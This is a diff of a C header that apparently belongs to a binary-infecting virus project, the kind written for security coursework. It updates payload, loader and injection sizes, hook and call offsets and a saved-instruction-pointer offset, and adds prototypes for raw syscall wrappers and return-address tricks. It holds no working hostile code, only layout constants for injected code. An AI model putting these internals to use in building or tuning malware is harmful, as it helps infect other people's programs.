@@ -21,26 +21,28 @@
 # define BUF_SIZE 0x20
 # define BIS_SIZE 0x137
 # define LOADER_SIZE 0x60
-# define PAYLOAD_SIZE 0x3068 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x2fc9 - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x30e5 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x301e - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + SIGN_SIZE
 
-# define OFFSET_1 0x22e6 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_2 0x2401 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_3 0x260e + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_4 0x2fd9 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_5 0x14dd + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_1 0x230f + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x242a + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x2637 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_4 0x3029 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_5 0x14dc + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_6 0x2f1d + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_RIP 0x2f2c - FT_MEMCPY_ADDR
 
-# define OFFSET_HOOK_1 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_1 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_2 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_2 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_3 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_3 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_4 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_4 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_5 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_5 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_1 0x2f47 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x2f3d + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x2f74 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x2f6a + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x2fa1 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x2f97 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x2fce + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x2fc4 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x2ffb + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x2ff1 + BIS_SIZE - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -110,6 +112,7 @@ int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
 ssize_t		ft_sysread(int fd, void *buf, size_t count);
 int			ft_strncmp(const char *s1, const char *s2, int n);
 int			ft_strlen(const char *s);
-void		handle_exit(void *addr);
+void		*get_rip();
+void		double_ret();
 
 #endif
